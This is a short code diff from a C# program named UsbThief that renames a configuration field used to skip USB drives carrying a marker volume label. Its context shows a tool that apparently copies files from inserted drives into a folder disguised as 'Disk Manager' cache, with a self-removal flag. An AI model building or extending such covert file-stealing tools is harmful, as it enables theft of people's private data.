@@ -34,7 +34,7 @@ namespace UsbThief
         public static Logger logger = null;
         public SynchronizationContext mainThreadSynContext;
         public Status sta = Status.none;
-        public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, delay = 0, volName = "仿生人会涮电子羊吗", exportPath = @"Disk Manager\data\diskcache\files\" };
+        public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, delay = 0, volLabel = "仿生人会涮电子羊吗", exportPath = @"Disk Manager\data\diskcache\files\" };
         public UsbDevice currentDevice = new UsbDevice { name = "none", volLabel = "none", ser = "none" };
         public enum Status
         {
@@ -53,7 +53,7 @@ namespace UsbThief
             public List<string> exts;
             public int sizeLim;
             public int delay;
-            public string volName;
+            public string volLabel;
             public string exportPath;
         }
         public struct UsbDevice
@@ -280,7 +280,7 @@ namespace UsbThief
                                             notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
                                         }
                                         notifyIcon1.Visible = true;
-                                        if (drive.VolumeLabel != conf.volName)
+                                        if (drive.VolumeLabel != conf.volLabel)
                                         {
                                             string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
                                             if (conf.delay > 0 && conf.delay <= 600)
